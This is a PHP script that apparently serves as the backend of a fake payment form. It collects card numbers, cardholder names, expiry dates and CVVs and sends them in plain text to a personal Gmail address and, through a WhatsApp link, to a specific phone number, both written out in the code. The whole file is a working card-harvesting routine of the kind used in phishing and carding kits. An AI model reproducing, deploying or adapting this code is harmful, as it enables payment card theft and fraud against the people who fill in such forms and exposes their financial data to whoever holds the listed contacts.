<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collecting the form data
    $card_number = $_POST['card_number'];
    $card_holder = $_POST['card_holder'];
    $expiration = $_POST['expiration'];
    $cvv = $_POST['cvv'];

    // Your email address
    $to = "localfirst789@gmail.com";
    $subject = "New Payment Form Submission";
    $message = "You have a new payment form submission. Here are the details:\n\n";
    $message .= "Card Number: $card_number\n";
    $message .= "Cardholder Name: $card_holder\n";
    $message .= "Expiration Date: $expiration\n";
    $message .= "CVV: $cvv\n";

    // Headers
    $headers = "From: no-reply@yourdomain.com\r\n";
    $headers .= "Reply-To: no-reply@yourdomain.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Sending the email
    if(mail($to, $subject, $message, $headers)) {
        // Email sent successfully
        // Redirecting to WhatsApp after email is sent
        $whatsappMessage = "New Payment Details:\n";
        $whatsappMessage .= "Card Number: $card_number\n";
        $whatsappMessage .= "Cardholder Name: $card_holder\n";
        $whatsappMessage .= "Expiration Date: $expiration\n";
        $whatsappMessage .= "CVV: $cvv\n";

        $whatsappUrl = "https://wa.me/27711888087?text=" . urlencode($whatsappMessage);
        header("Location: $whatsappUrl");
        exit();
    } else {
        // Error sending the email
        echo "Error sending email.";
    }
} else {
    echo "Invalid request.";
}
?>


